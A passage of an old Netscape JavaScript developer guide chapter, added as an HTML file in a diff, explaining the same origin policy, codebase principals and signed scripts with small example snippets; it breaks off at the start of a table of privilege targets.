@@ -1,0 +1,850 @@
+<HTML>
+<HEAD>
+<TITLE>JavaScript Security
+</TITLE>
+</HEAD>
+
+<BODY BGCOLOR="#FFFFFF" TEXT="#000000">
+
+<FONT SIZE=-1><A HREF="contents.htm">Table of Contents</A> | <A HREF="advtopic.htm">Previous</A>
+ | <A HREF="partlc.htm">Next</A>
+ | <A HREF="bklast.htm">Index</A>
+</FONT><BR><BR>
+<HR>
+<A NAME="1001595">
+<P></A><CENTER><H2>Chapter 14<BR>
+<A NAME="1019081">
+JavaScript Security</A></H2></CENTER>
+<A NAME="1021159">
+JavaScript automatically prevents scripts on one server from accessing properties of documents on a different server. This restriction prevents scripts from fetching private information such as directory structures or user session history. This chapter describes the security models available in various releases of JavaScript.</A></P>
+<A NAME="1020653">
+This chapter contains the following sections:</A></P>
+<ul><LI><A NAME="1020654">
+<A HREF="sec.htm#1015705">Same Origin Policy</A>
+</A></LI><LI><A NAME="1020837">
+<A HREF="sec.htm#1015075">Using Signed Scripts</A>
+</A></LI><LI><A NAME="1020655">
+<A HREF="sec.htm#1021266">Using Data Tainting</A>
+</A></LI></ul><A NAME="1015948">
+The following list gives a historical overview of JavaScript security:</A></P>
+<ul><P><LI><A NAME="1023136">
+In all releases, the <I>same origin</I> policy is the default policy. This policy restricts getting or setting properties based on document server. See <A HREF="sec.htm#1015705">"Same Origin Policy" on page&nbsp;212</A>.</A></LI>
+<P><LI><A NAME="1015961">
+JavaScript&nbsp;1.1 used <I>data tainting</I> to access additional information. See <A HREF="sec.htm#1021266">"Using Data Tainting" on page&nbsp;240</A>.</A></LI>
+<P><LI><A NAME="1023150">
+JavaScript&nbsp;1.2 replaced data tainting with the <I>signed script</I> policy. This policy is based on the Java <I>object signing</I> security model. To use the signed script policy in JavaScript, you use specific Java security classes and sign your JavaScript scripts. See <A HREF="sec.htm#1015075">"Using Signed Scripts" on page&nbsp;215</A>.</A></LI>
+</ul>
+<HR><H2><A NAME="Same Origin Policy"></A>
+<A NAME="1015705">
+ Same Origin Policy
+</A></H2><A NAME="1015706">
+The same origin policy works as follows: when loading a document from one origin, a script loaded from a different origin cannot get or set specific properties of specific browser and HTML objects in a window or frame (see <A HREF="sec.htm#1015768">Table 14.2</A>).</A></P>
+<A NAME="1015710">
+For security purposes, JavaScript defines the origin as the substring of a URL that includes <CODE>protocol://host</CODE> where <CODE>host</CODE> includes the optional <CODE>:port</CODE>. To illustrate, the following table gives examples of origin comparisons to the URL <CODE>http://company.com/dir/page.html</CODE>.</A></P>
+<A NAME="1020257">
+<P><B><A NAME="1015717">
+Table 14.1&nbsp;Same origin comparisons to http://company.com/dir/page.html</A></B>
+<TABLE BORDER="2" CELLPADDING=5>
+<TR><TH VALIGN=baseline ALIGN=left><B><A NAME="1015723">
+<B>URL
+</B></A><B><TH VALIGN=baseline ALIGN=left><B><A NAME="1015725">
+<B>Outcome
+</B></A><B><TH VALIGN=baseline ALIGN=left><B><A NAME="1015727">
+<B>Reason
+</B></A><B>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015729">http://company.com/dir2/other.html</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015731">
+Success</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1015733">
+</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015735">http://company.com/dir/inner/another.html</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015737">
+Success</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1015739">
+</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015741">http://www.company.com/dir/other.html</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015743">
+Failure</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1015745">
+Different domains</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015747">file://D|/myPage.htm</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015749">
+Failure</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1015751">
+Different protocols</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015753">http://company.com:80/dir/etc.html</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015755">
+Failure</A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1015757">
+Different port</A></P>
+
+</TABLE>
+<TABLE>
+<TR><TD>
+</TABLE>
+</A></P>
+<A NAME="1015764">
+The following table lists the properties that can be accessed only by scripts that pass the same origin check.</A></P>
+<A NAME="1020307">
+<P><B><A NAME="1015768">
+Table 14.2&nbsp;Properties subject to origin check</A></B>
+<TABLE BORDER="2" CELLPADDING=5>
+<TR><TH VALIGN=baseline ALIGN=left><B><A NAME="1015772">
+<B>Object
+</B></A><B><TH VALIGN=baseline ALIGN=left><B><A NAME="1015774">
+<B>Properties subject to origin check
+</B></A><B>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024794">document</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024796">
+For both read and write: <CODE>anchors</CODE>, <CODE>applets</CODE>, <CODE>cookie</CODE>, <CODE>domain</CODE>, <CODE>embeds</CODE>, <CODE>forms</CODE>, <CODE>lastModified</CODE>, <CODE>length</CODE>, <CODE>links</CODE>, <CODE>referrer</CODE>, <CODE>title</CODE>, <CODE>URL</CODE>, <I><CODE>formName</CODE></I> (for each named form), <I><CODE>reflectedJavaClass</CODE></I> (for each Java class reflected into JavaScript using LiveConnect)</A></P><P><A NAME="1024797">
+</A></P><P><A NAME="1024798">
+For write only: all other properties</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1024763">form</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1024765">
+elements</A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015776">image</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015778">
+<CODE>lowsrc</CODE>, <CODE>src</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015780">layer</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015782">
+<CODE>src</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015784">location</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1015786">
+All except <CODE>x</CODE> and <CODE>y</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015788">window</A></PRE><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1015790">find</A></PRE>
+
+</TABLE>
+<TABLE>
+<TR><TD>
+</TABLE>
+</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1023451">
+ Origin Checks and document.domain
+</A></H3>
+
+<A NAME="1023292">
+There is one exception to the same origin rule. A script can set the value of <CODE>document.domain</CODE> to a suffix of the current domain. If it does so, the shorter domain is used for subsequent origin checks. For example, suppose a script in the document at <CODE>http://www.company.com/dir/other.html</CODE> executes the following statement:</A></P>
+<PRE><A NAME="1023293">document.domain = "company.com";</A></PRE><A NAME="1023294">
+After execution of that statement, the page would pass the origin check with <CODE>http://company.com/dir/page.html</CODE>.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1023386">
+ Origin Checks of Named Forms
+</A></H3>
+
+<A NAME="1023394">
+Named forms are subject to an origin check, as described in <A HREF="sec.htm#1015768">Table 14.2</A>.</A></P>
+<B><A NAME="HeadRunIn;"></A>
+<A NAME="1023381">
+JavaScript&nbsp;1.1 and earlier versions. </A></B><A NAME="1023382">
+Named forms are not subject to an origin check even though the <CODE>document.forms</CODE> array is. To work around security errors that result when a 1.1 script runs in 1.2 or later versions, create a new variable as a property of the <CODE>window</CODE> object, setting the named form as the value of the variable. You can then access that variable (and hence the form) through the <CODE>window</CODE> object.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1015801">
+ Origin Checks and SCRIPT Tags that Load Documents
+</A></H3>
+
+<A NAME="1023346">
+If you load a document with any URL other than a <CODE>file:</CODE> URL, and that document itself contains a <CODE>&lt;SCRIPT SRC="..."&gt;</CODE> tag, the internal <CODE>SRC</CODE> attribute cannot refer to another <CODE>file:</CODE> URL.</A></P>
+<B><A NAME="HeadRunIn;"></A>
+<A NAME="1023362">
+JavaScript&nbsp;1.1 and earlier versions. </A></B><A NAME="1023356">
+When you load a JavaScript file using <CODE>&lt;SCRIPT SRC="..."&gt;</CODE>, the URL specified in the <CODE>SRC</CODE> attribute can be any URL type (<CODE>file:</CODE>, <CODE>http:</CODE>, and so on), regardless of the URL type of the file that contained the <CODE>SCRIPT</CODE> tag. To get JavaScript 1.1 behavior in JavaScript 1.2, users can add the following line to their preferences file:</A></P>
+<PRE><A NAME="1015805">user_pref("javascript.allow.file_src_from_non_file", true);</A></PRE><A NAME="1015806">
+Be cautious with this preference, because it opens a security hole. Users should set this preference only if they have a reason for accepting the associated risks.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1015807">
+ Origin Checks and Layers
+</A></H3>
+
+<A NAME="1015808">
+A layer can have a different origin than the surrounding document. Origin checks are made between documents and scripts in layers from different origins. That is, if a document has one or more layers, JavaScript checks the origins of those layers before they can interact with each other or with the parent document.</A></P>
+<A NAME="1015814">
+For information on layers, see <A HREF="http://developer.netscape.com/docs/manuals/communicator/dynhtml/index.htm" TARGET="_top"><EM>Dynamic HTML in Netscape Communicator</A></EM>.<EM></EM></A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1015815">
+ Origin Checks and Java Applets
+</A></H3>
+
+<A NAME="1015816">
+Your HTML page can contain <CODE>APPLET</CODE> tags to use Java applets. If an <CODE>APPLET</CODE> tag has the <CODE>MAYSCRIPT</CODE> attribute, that applet can use JavaScript. In this situation, the applet is subject to origin checks when calling JavaScript. For this purpose, the origin of the applet is the URL of the document that contains the <CODE>APPLET</CODE> tag.</A></P>
+
+<HR><H2><A NAME="Using Signed Scripts"></A>
+<A NAME="1015075">
+ Using Signed Scripts
+</A></H2><A NAME="1021743">
+The JavaScript security model for signed scripts is based upon the Java security model for signed objects. The scripts you can sign are inline scripts (those that occur within the <CODE>SCRIPT</CODE> tag), event handlers, JavaScript entities, and separate JavaScript files.</A></P>
+<B><A NAME="HeadRunIn;"></A>
+<A NAME="1023542">
+JavaScript&nbsp;1.1 and earlier versions. </A></B><A NAME="1024007">
+Signed scripts are not available.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1015077">
+ Introduction to Signed Scripts
+</A></H3>
+
+<A NAME="1015078">
+A signed script requests expanded privileges, gaining access to restricted information. It requests these privileges by using LiveConnect and Java classes referred to as the Java Capabilities API. These classes add facilities to and refine the control provided by the standard Java <CODE>SecurityManager</CODE> class. You can use these classes to exercise fine-grained control over activities beyond the "sandbox"--the Java term for the carefully defined limits within which Java code must otherwise operate.</A></P>
+<A NAME="1015079">
+All access-control decisions boil down to who is allowed to do what. In this model, a <EM>principal</EM> represents the "who," a <EM>target</EM> represents the "what," and the <EM>privileges</EM> associated with a principal represent the authorization (or denial of authorization) for a principal to access a specific target.</A></P>
+<A NAME="1024088">
+Once you have written a script, you sign it using the Netscape Signing Tool. This tool associates a digital signature with the scripts on an HTML page. That digital signature is owned by a particular principal (a real-world entity such as Netscape or John Smith). A single HTML page can have scripts signed by different principals. The digital signature is placed in a Java Archive (JAR) file. If you sign an inline script, event handler, or JavaScript entity, the Netscape Signing Tool stores only the signature and the identifier for the script in the JAR file. If you sign a JavaScript file with the Netscape Signing Tool, it stores the source in the JAR file as well.</A></P>
+<A NAME="1015081">
+The associated principal allows the user to confirm the validity of the certificate used to sign the script. It also allows the user to ensure that the script has not been tampered with since it was signed. The user then can decide whether to grant privileges based on the validated identity of the certificate owner and validated integrity of the script.</A></P>
+<A NAME="1015082">
+Keep in mind that a user may deny the privileges requested by your script--you should write your scripts to react gracefully to such decisions.</A></P>
+<A NAME="1015083">
+This chapter assumes that you are familiar with the basic principles of object signing, using the Java Capabilities API, and creating digital signatures. The following documents provide information on these subjects:</A></P>
+<ul><P><LI><A NAME="1015089">
+<EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/trust/index.htm" TARGET="_top">Netscape Object Signing: Establishing Trust for Downloaded Software</A></EM> provides an overview of object signing. Be sure you understand this material before using signed scripts.</A></LI>
+<P><LI><A NAME="1015095">
+<EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/capabilities/index.html" TARGET="_top">Introduction to the Capabilities Classes</A></EM> gives details on how to use the Java Capabilities API. Because signed scripts use this API to request privileges, you need to understand this information.</A></LI>
+<P><LI><A NAME="1015101">
+<EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/capsapi.html" TARGET="_top">Java Capabilities API</A></EM> introduces the Java API used for object signing and provides details on where to find more information about this API.</A></LI>
+<P><LI><A NAME="1023763">
+<EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/signtool/index.htm" TARGET="_top">Signing Software with Netscape Signing Tool 1.1</EM></A> describes the Netscape Signing Tool for creating signed scripts.</A></LI>
+<P><LI><A NAME="1015113">
+<EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/index.html" TARGET="_top">Object-Signing Resources</A></EM> lists documents and resources that provide information on object signing.</A></LI>
+</ul>
+<H4><A NAME="Head3;"></A>
+<A NAME="1015125">
+ SSL Servers and Unsigned Scripts
+</A></H4>
+
+<A NAME="1015126">
+An alternative to using the Netscape Signing Tool to sign your scripts is to serve them from a secure server. Navigator treats all pages served from an SSL server as if they were signed with the public key of that server. You do not have to sign the individual scripts for this to happen.</A></P>
+<A NAME="1015127">
+If you have an SSL server, this is a much simpler way to get your scripts to act as though they are signed. This is particularly helpful if you dynamically generate scripts on your server and want them to behave as if signed.</A></P>
+<A NAME="1015129">
+For information on setting up a Netscape server as an SSL server, see <A HREF="http://developer.netscape.com/docs/manuals/enterprise/mngserv/index.htm" TARGET="_top"><EM>Managing Netscape Servers</A></EM>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015135">
+ Codebase Principals
+</A></H4>
+
+<A NAME="1015136">
+As does Java, JavaScript supports codebase principals. A <I>codebase principal</I> is a principal derived from the origin of the script rather than from verifying a digital signature of a certificate. Since codebase principals offer weaker security, they are disabled by default in Navigator.</A></P>
+<A NAME="1015137">
+For deployment, your scripts should not rely on codebase principals being enabled. You might want to enable codebase principals when developing your scripts, but you should sign them before delivery.</A></P>
+<A NAME="1015138">
+To enable codebase principals, end users must add the appropriate preference to their Navigator preference file. To do so, add this line to the file:</A></P>
+<PRE><A NAME="1015139">user_pref("signed.applets.codebase_principal_support", true);</A></PRE><A NAME="1015140">
+Even when codebase principals are disabled, Navigator keeps track of codebase principals to use in enforcement of the same origin security policy (see <A HREF="sec.htm#1015705">"Same Origin Policy" on page&nbsp;212</A>). Unsigned scripts have an associated set of principals that contains a single element, the codebase principal for the page containing the script. Signed scripts also have codebase principals in addition to the stronger certificate principals.</A></P>
+<A NAME="1015144">
+When the user accesses the script with codebase principals enabled, a dialog box is displayed similar to the one displayed with signed scripts. The difference is that this dialog box asks the user to grant privileges based on the URL and does not provide author verification. It advises the user that the script has not been digitally signed and may have been tampered with.</A></P>
+<BLOCKQUOTE><B>NOTE: </B><A NAME="1015146">
+If a page includes signed scripts and codebase scripts, and 
+<CODE>signed.applets.codebase_principal_support</CODE> is enabled, all of the scripts 
+on that page are treated as though they are unsigned, and codebase principals 
+apply.
+</A>
+</BLOCKQUOTE>
+<A NAME="1015148">
+For more information on codebase principals, see <EM><A HREF="http://developer.netscape.com/docs/manuals/signedobj/capabilities/index.html" TARGET="_top">Introduction to the Capabilities Classes</A></EM>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015150">
+ Scripts Signed by Different Principals
+</A></H4>
+
+<A NAME="1015151">
+JavaScript differs from Java in several important ways that relate to security. Java signs classes and is able to protect internal methods of those classes through the public/private/protected mechanism. Marking a method as protected or private immediately protects it from an attacker. In addition, any class or method marked <CODE>final</CODE> in Java cannot be extended and so is protected from an attacker.</A></P>
+<A NAME="1015152">
+On the other hand, because JavaScript has no concept of public and private methods, there are no internal methods that could be protected by simply signing a class. In addition, all methods can be changed at runtime, so must be protected at runtime.</A></P>
+<A NAME="1015153">
+In JavaScript you can add new properties to existing objects, or replace existing properties (including methods) at runtime. You cannot do this in Java. So, once again, protection that is automatic in Java must be handled separately in JavaScript.</A></P>
+<A NAME="1015154">
+While the signed script security model for JavaScript is based on the object signing model for Java, these differences in the languages mean that when JavaScript scripts produced by different principals interact, it is much harder to protect the scripts. Because all of the JavaScript code on a single HTML page runs in the same process, different scripts on the same page can change each other's behavior. For example, a script might redefine a function defined by an earlier script on the same page.</A></P>
+<A NAME="1015155">
+To ensure security, the basic assumption of the JavaScript signed script security model is that <I>mixed scripts on an HTML page operate as if they were all signed by the intersection of the principals that signed each script</I>.</A></P>
+<A NAME="1015156">
+For example, assume principals A and B have signed one script, but only principal A signed another script. In this case, a page with both scripts acts as if it were signed by only A.</A></P>
+<A NAME="1015157">
+This assumption also means that if a signed script is on the same page as an unsigned script, both scripts act as if they were unsigned. This occurs because the signed script has a codebase principal and a certificate principal, whereas the unsigned script has only a codebase principal (see <A HREF="sec.htm#1015135">"Codebase Principals" on page&nbsp;217</A>). The two codebase principals are always the same for scripts from the same page; therefore, the intersection of the principals of the two scripts yields only the codebase principal. This is also what happens if both scripts are unsigned.</A></P>
+<A NAME="1015161">
+You can use the <CODE>import</CODE> and <CODE>export</CODE> functions to allow scripts signed by different principals to interact in a secure fashion. For information on how to do so, see <A HREF="sec.htm#1015381">"Importing and Exporting Functions" on page&nbsp;231</A>.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1015165">
+ Checking Principals for Windows and Layers
+</A></H4>
+
+<A NAME="1015166">
+In order to protect signed scripts from tampering, JavaScript has a set of checks at the container level, where a container is either a window or a layer. To access the properties of a signed container, the script seeking access must be signed by a superset of the principals that signed the container.</A></P>
+<A NAME="1015167">
+These cross-container checks apply to most properties, whether predefined (by Navigator) or user-defined (whether by HTML content, or by script functions and variables). The cross-container checks do not apply to the following properties of <CODE>window</CODE>:</A></P>
+<ul><LI><A NAME="1015168">
+<CODE>closed</CODE>
+</A></LI><LI><A NAME="1015169">
+<CODE>height</CODE>
+</A></LI><LI><A NAME="1015170">
+<CODE>outerHeight</CODE>
+</A></LI><LI><A NAME="1015171">
+<CODE>outerWidth</CODE>
+</A></LI><LI><A NAME="1015172">
+<CODE>pageXOffset</CODE>
+</A></LI><LI><A NAME="1015173">
+<CODE>pageYOffset</CODE>
+</A></LI><LI><A NAME="1015174">
+<CODE>screenX</CODE>
+</A></LI><LI><A NAME="1015175">
+<CODE>screenY</CODE>
+</A></LI><LI><A NAME="1015176">
+<CODE>secure</CODE>
+</A></LI><LI><A NAME="1015177">
+<CODE>width</CODE>
+</A></LI></ul><A NAME="1016210">
+If all scripts on a page are signed by the same principals, container checks are applied to the window. If some scripts in a layer are signed by different principals, the special container checks apply to the layer. The following figure illustrates the method Navigator uses to determine which containers are associated with which sets of principals.</A></P>
+<P><A NAME="1016215">
+<B>Figure 14.1&nbsp;&nbsp;&nbsp;Assigning principals to layers<P>
+<IMG SRC="graphics/containr.gif">
+
+</B></A></P>
+
+
+<A NAME="1016216">
+This method works as follows: Consider each script on the page in order of declaration, treating <CODE>javascript:</CODE> URLs as new unsigned scripts.</A></P>
+<OL>
+<P><LI><A NAME="1015188">
+If this is the first script that has been seen on the page, assign this script's principals to be the principals for the window. (If the current script is unsigned, this makes the window's principal a codebase principal.) Done.</A></LI>
+<P><LI><A NAME="1015189">
+If the innermost container (the container directly including the script) has defined principals, intersect the current script's principals with the container's principals and assign the result to be the principals for the container. If the two sets of principals are not equal, intersecting the sets reduces the number of principals associated with the container. Done.</A></LI>
+<P><LI><A NAME="1015190">
+Otherwise, find the innermost container that has defined principals. (This may be the window itself, if there are no intermediate layers.) If the principals of the current script are the same as the principals of that container, leave the principals as is. Done.</A></LI>
+<P><LI><A NAME="1015191">
+Otherwise, assign the current script's principals to be the principals of the container. Done.</A></LI>
+</OL>
+<A NAME="1015192">
+<A HREF="sec.htm#1016215">Figure 14.1</A> illustrates this process.</A></P>
+<A NAME="1015193">
+For example, assume a page has two scripts (and no layers), with one script signed and the other unsigned. Navigator first sees the signed script, which causes the <CODE>window</CODE> object to be associated with two principals--the certificate principal from the signer of the script and the codebase principal derived from the location of the page containing the script.</A></P>
+<A NAME="1015194">
+When Navigator sees the second (unsigned) script, it compares the principals of that script with the principals of the current container. The unsigned script has only one principal, the codebase principal. Without layers, the innermost container is the window itself, which already has principals.</A></P>
+<A NAME="1015195">
+Because the sets of principals differ, they are intersected, yielding a set with one member, the codebase principal. Navigator stores the result on the <CODE>window</CODE> object, narrowing its set of principals. Note that all functions that were defined in the signed script are now considered unsigned. Consequently, mixing signed and unsigned scripts on a page without layers results in all scripts being treated as if they were unsigned.</A></P>
+<A NAME="1015196">
+Now assume the unsigned script is in a layer on the page. This results in different behavior. In this case, when Navigator sees the unsigned script, its principals are again compared to those of the signed script in the window and the principals are found to be different. However, now that the innermost container (the layer) has no associated principals, the unsigned principals are associated with the innermost container; the outer container (the window) is untouched. In this case, signed scripts continue to operate as signed. However, accesses by the unsigned script in the layer to objects outside the layer are rejected because the layer has insufficient principals. See <A HREF="sec.htm#1015368">"Isolating an Unsigned Layer within a Signed Container" on page&nbsp;230</A> for more information on this case.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1015201">
+ Identifying Signed Scripts
+</A></H3>
+
+<A NAME="1024543">
+You can sign inline scripts, event handler scripts, JavaScript files, and JavaScript entities. You cannot sign <CODE>javascript:</CODE> URLs. You must identify the thing you are signing within the HTML file:</A></P>
+<ul><P><LI><A NAME="1015203">
+To sign an inline script, you add both an <CODE>ARCHIVE</CODE> attribute and an <CODE>ID</CODE> attribute to the <CODE>SCRIPT</CODE> tag for the script you want to sign. If you do not include an <CODE>ARCHIVE</CODE> attribute, Navigator uses the <CODE>ARCHIVE</CODE> attribute from an earlier script on the same page.</A></LI>
+<P><LI><A NAME="1015204">
+To sign an event handler, you add an <CODE>ID</CODE> attribute for the event handler to the tag containing the event handler. In addition, the HTML page must also contain a signed inline script preceding the event handler. That <CODE>SCRIPT</CODE> tag must supply the <CODE>ARCHIVE</CODE> attribute.</A></LI>
+<P><LI><A NAME="1015205">
+To sign a JavaScript entity, you do not do anything special to the entity. Instead, the HTML page must also contain a signed inline script preceding the JavaScript entity. That <CODE>SCRIPT</CODE> tag must supply the <CODE>ARCHIVE</CODE> and <CODE>ID</CODE> attributes.</A></LI>
+<P><LI><A NAME="1015206">
+To sign an entire JavaScript file, you do not add anything special to the file. Instead, the <CODE>SCRIPT</CODE> tag for the script that uses that file must contain the <CODE>ARCHIVE</CODE> attribute.</A></LI>
+</ul><A NAME="1023575">
+Once you have written the HTML file, see <A HREF="sec.htm#1015441">"Signing Scripts" on page&nbsp;237</A> for information on how to sign it.</A></P>
+
+<H4><A NAME="Head3;"></A>
+<A NAME="1023577">
+ ARCHIVE Attribute
+</A></H4>
+
+<A NAME="1023578">
+All signed scripts (inline script, event handler, JavaScript file, or JavaScript entity) require a <CODE>SCRIPT</CODE> tag's <CODE>ARCHIVE</CODE> attribute whose value is the name of the JAR file containing the digital signature. For example, to sign a JavaScript file, you could use this tag:</A></P>
+<PRE><A NAME="1015213">&lt;SCRIPT ARCHIVE="myArchive.jar" SRC="myJavaScript.js"&gt; &lt;/SCRIPT&gt;</A></PRE><A NAME="1015214">
+Event handler scripts do not directly specify the <CODE>ARCHIVE</CODE>. Instead, the handler must be preceded by a script containing <CODE>ARCHIVE</CODE>. For example:</A></P>
+<PRE><A NAME="1015215">&lt;SCRIPT ARCHIVE="myArchive.jar" ID="a"&gt;<br>...<br>&lt;/SCRIPT&gt;</A></PRE><PRE><A NAME="1024214">&lt;FORM&gt;<br>&lt;INPUT TYPE="button" VALUE="OK" <br>&nbsp;&nbsp;&nbsp;onClick="alert('A signed script')" ID="b"&gt; <br>&lt;/FORM&gt;</A></PRE><A NAME="1015217">
+Unless you use more than one JAR file, you need only specify the file once. Include the <CODE>ARCHIVE</CODE> tag in the first script on the HTML page, and the remaining scripts on the page use the same file. For example:</A></P>
+<PRE><A NAME="1015218">&lt;SCRIPT ARCHIVE="myArchive.jar" ID="a"&gt; <br>document.write("This script is signed."); <br>&lt;/SCRIPT&gt;</A></PRE><PRE><A NAME="1015219">&lt;SCRIPT ID="b"&gt; <br>document.write("This script is signed too.");<br>&lt;/SCRIPT&gt;</A></PRE>
+<H4><A NAME="Head3;"></A>
+<A NAME="1015220">
+ ID Attribute
+</A></H4>
+
+<A NAME="1015221">
+Signed inline and event handler scripts require the <CODE>ID</CODE> attribute. The value of this attribute is a string that relates the script to its signature in the JAR file. The <CODE>ID</CODE> must be unique within a JAR file.</A></P>
+<A NAME="1015222">
+When a tag contains more than one event handler script, you only need one <CODE>ID</CODE>. The entire tag is signed as one piece.</A></P>
+<A NAME="1015223">
+In the following example, the first three scripts use the same JAR file. The third script accesses a JavaScript file so it does not use the <CODE>ID</CODE> tag. The fourth script uses a different JAR file, and its <CODE>ID</CODE> of <CODE>"a"</CODE> is unique to that file.</A></P>
+<PRE><A NAME="1015224">&lt;HTML&gt;</A></PRE><PRE><A NAME="1015225">&lt;SCRIPT ARCHIVE="firstArchive.jar" ID="a"&gt; <br>document.write("This is a signed script."); <br>&lt;/SCRIPT&gt;</A></PRE><PRE><A NAME="1015226">&lt;BODY<br>&nbsp;&nbsp;&nbsp;onLoad="alert('A signed script using firstArchive.jar')"<br>&nbsp;&nbsp;&nbsp;onLoad="alert('One ID needed for these event handler scripts')"<br>&nbsp;&nbsp;&nbsp;ID="b"&gt;</A></PRE><PRE><A NAME="1015227">&lt;SCRIPT SRC="myJavaScript.js"&gt;<br>&lt;/SCRIPT&gt;</A></PRE><PRE><A NAME="1015228">&lt;LAYER&gt;<br>&lt;SCRIPT ARCHIVE="secondArchive.jar" ID="a"&gt; <br>document.write("This script uses the secondArchive.jar file.");<br>&lt;/SCRIPT&gt;<br>&lt;/LAYER&gt;</A></PRE><PRE><A NAME="1015229">&lt;/BODY&gt;<br>&lt;/HTML&gt;</A></PRE>
+<H3><A NAME="Head2;"></A>
+<A NAME="1015231">
+ Using Expanded Privileges
+</A></H3>
+
+<A NAME="1015232">
+As with Java signed objects, signed scripts use calls to Netscape's Java security classes to request expanded privileges. The Java classes are explained in <EM>Java Capabilities API</EM>.</A></P>
+<A NAME="1015233">
+In the simplest case, you add one line of code asking permission to access a particular target representing the resource you want to access. (See <A HREF="sec.htm#1015251">"Targets" on page&nbsp;226</A> for more information.) For example:</A></P>
+<PRE><A NAME="1015237">netscape.security.PrivilegeManager.enablePrivilege("UniversalSendMail")</A></PRE><A NAME="1015238">
+When the script calls this function, the signature is verified, and if the signature is valid, expanded privileges can be granted. If necessary, a dialog box displays information about the application's author, and gives the user the option to grant or deny expanded privileges.</A></P>
+<A NAME="1015239">
+Privileges are granted only in the scope of the requesting function and only after the request has been granted in that function. This scope includes any functions called by the requesting function. When the script leaves the requesting function, privileges no longer apply.</A></P>
+<A NAME="1015240">
+The following example demonstrates this by printing this text:</A></P>
+<PRE><A NAME="1015241">7: disabled<br>5: disabled<br>2: disabled<br>3: enabled<br>1: enabled<br>4: enabled<br>6: disabled<br>8: disabled</A></PRE><A NAME="1015242">
+Function <CODE>g</CODE> requests expanded privileges, and only the commands and functions called after the request and within function <CODE>g</CODE> are granted privileges.</A></P>
+<PRE><A NAME="1015243">&lt;SCRIPT ARCHIVE="ckHistory.jar" ID="a"&gt;</A></PRE><PRE><A NAME="1015244">function printEnabled(i) {<br>&nbsp;&nbsp;&nbsp;if (history[0] == "") {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(i + ": disabled&lt;BR&gt;");<br>&nbsp;&nbsp;&nbsp;} else {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(i + ": enabled&lt;BR&gt;"); <br>&nbsp;&nbsp;&nbsp;}<br>}</A></PRE><PRE><A NAME="1015245">function f() {<br>&nbsp;&nbsp;&nbsp;printEnabled(1); <br>}</A></PRE><PRE><A NAME="1015246">function g() {<br>&nbsp;&nbsp;&nbsp;printEnabled(2);<br>&nbsp;&nbsp;&nbsp;netscape.security.PrivilegeManager.enablePrivilege(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"UniversalBrowserRead");<br>&nbsp;&nbsp;&nbsp;printEnabled(3);<br>&nbsp;&nbsp;&nbsp;f();<br>&nbsp;&nbsp;&nbsp;printEnabled(4); <br>}</A></PRE><PRE><A NAME="1015247">function h() {<br>&nbsp;&nbsp;&nbsp;printEnabled(5);<br>&nbsp;&nbsp;&nbsp;g(); <br>&nbsp;&nbsp;&nbsp;printEnabled(6); <br>}</A></PRE><PRE><A NAME="1015248">printEnabled(7); <br>h(); <br>printEnabled(8);</A></PRE><PRE><A NAME="1015249">&lt;/SCRIPT&gt;</A></PRE>
+<H4><A NAME="Head3;"></A>
+<A NAME="1015251">
+ Targets
+</A></H4>
+
+<A NAME="1015252">
+The types of information you can access are called targets. These are listed in the following table.</A></P>
+<A NAME="1020341">
+<P><B></B>
+<TABLE BORDER="2" CELLPADDING=5>
+<TR><TH VALIGN=baseline ALIGN=left><B><A NAME="1015255">
+<B>Target
+</B></A><B><TH VALIGN=baseline ALIGN=left><B><A NAME="1015257">
+<B>Description
+</B></A><B>
